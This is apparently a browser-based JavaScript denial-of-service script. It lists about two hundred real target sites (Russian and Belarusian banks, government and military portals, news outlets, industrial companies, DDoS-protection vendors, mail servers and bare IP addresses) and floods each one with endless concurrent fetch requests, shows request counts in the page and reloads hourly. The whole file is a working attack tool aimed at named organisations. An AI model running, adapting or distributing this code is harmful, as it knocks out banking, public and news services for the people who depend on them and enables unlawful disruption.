        var targets = {
            'https://absolutbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.avangard.ru/rus/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.avtogradbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.autokreditbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.agroros.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ai-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://bank.yandex.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.ak-bars.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.aksonbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.aktivbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.akcia-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.alexbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.alefbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://albank.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://altbb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://capitalbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://alfabank.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.atb.su/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.andjibank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.mfk-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.aresbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://bank-arzamas.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.aspectbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://assotsiatsiyabank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://baikalrosbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://byrich.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.vtb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://norvikbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.zemsky.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.unicreditbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.open.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.raiffeisen.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://abr.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ria.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://gazeta.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://kp.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://riafan.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://pikabu.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://kommersant.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://mk.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://yaplakal.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://rbc.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://bezformata.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://gazprom.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://lukoil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://magnit.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://nornickel.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://surgutneftegas.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://tatneft.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://nlmk.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://sibur.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://severstal.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://metalloinvest.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://nangs.org': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://rmk-group.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://tmk-group.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ya.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://eurosib.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://omk.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://vtb.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://gazprombank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://gosuslugi.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://mos.ru/uslugi': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://government.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://mil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://nalog.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://customs.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://pfr.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://rkn.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://lenta.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://vsoloviev.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.1tv.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.vesti.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://iz.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ukraina.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.gazprom.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://lukoil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://magnit.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.nornickel.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.surgutneftegas.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.tatneft.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://nlmk.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.sibur.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.severstal.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.metalloinvest.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.tmk-group.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.eurosib.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.vtb.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.gazprombank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.gosuslugi.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.mos.ru/uslugi/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://government.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.nalog.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://newletters.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://20.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://constitution.kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },            
            'https://belres.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://belta.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.ctv.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.mil.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://belarus24.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://alfaradio.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.kgb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.sb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://sputnik.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://rec.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://radiomir.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://radiostalica.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://radiobrestfm.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.tvrmogilev.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://minsknews.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://zarya.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://grodnonews.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.tvr.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://yandex.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://belarusbank.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.nbrb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://brrb.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.belapb.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://bankdabrabyt.by/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://mail.rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://cloud.rkn.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://mvd.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://pwd.wto.economy.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://stroi.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://proverki.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ont.by': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://nbrb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://bgb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://belres.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://energo.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.bellegprom.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.belneftekhim.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://shop-rt.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://sb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://belarusbank.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://belarus.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://belmarket.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://rec.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://mil.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://vtb.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ya.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://president.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 },
		'https://dnronline.su': { number_of_requests: 0, number_of_errored_responses: 0 },
		'https://fsb.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
		'https://webmoney.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
		'https://ddos-guard.net/ru': { number_of_requests: 0, number_of_errored_responses: 0 },
		'https://stormwall.pro': { number_of_requests: 0, number_of_errored_responses: 0 },
		'https://grator.net/ru': { number_of_requests: 0, number_of_errored_responses: 0 },
		'https://solidwall.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
	'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://www.gazeta.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://yandex.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://sputnik.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://mvd.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://uc-osnovanie.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://iecp.ru/ep/uc-list': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://www.roseltorg.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://www.nwudc.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://www.kt-69.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://www.rcarus.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://kommersant.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://email12.sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://email11.sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://mx4.cbr.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://mx3.cbr.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://iecp.ru/ep/ep-verification': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://www.mk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://www.sber.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://profile.sber.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://185.157.96.130': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://84.252.144.102': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://rg.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://82.202.190.91': { number_of_requests: 0, number_of_errored_responses: 0 },
'https://194.190.37.226': { number_of_requests: 0, number_of_errored_responses: 0 },
}

        var statsEl = document.getElementById('stats');
        function printStats() {
            statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
        }
        setInterval(printStats, 100);

        var CONCURRENCY_LIMIT = 200
        var queue = []

        async function fetchWithTimeout(resource, options) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), options.timeout);
            return fetch(resource, {
                signal: controller.signal,
                mode: 'no-cors'
            }).then((response) => {
                clearTimeout(id);
                return response;
            }).catch((error) => {
                clearTimeout(id);
                throw error;
            });
        }

        async function flood(target) {
            while (true) {
                if (queue.length > CONCURRENCY_LIMIT) {
                    await queue.shift()
                }
                queue.push(
                    fetchWithTimeout(target, { timeout: 600 })
                        .catch((error) => {
                            if (error.code === 20 /* ABORT */) {
                                return;
                            }
                            targets[target].number_of_errored_responses++;
                            targets[target].error_message = error.message
                        })
                        .then((response) => {
                            if (response && !response.ok) {
                                targets[target].number_of_errored_responses++;
                                targets[target].error_message = response.statusText
                            }
                            targets[target].number_of_requests++;
                        })


                )
            }
        }

        //Start
        Object.keys(targets).map(flood)

	//Refresh every day and clear up some RAM
 $(document).ready(function(){
    setInterval(function(){ reload_page(); },60*60000);
 });

 function reload_page()
 {
    window.location.reload(true);
 }
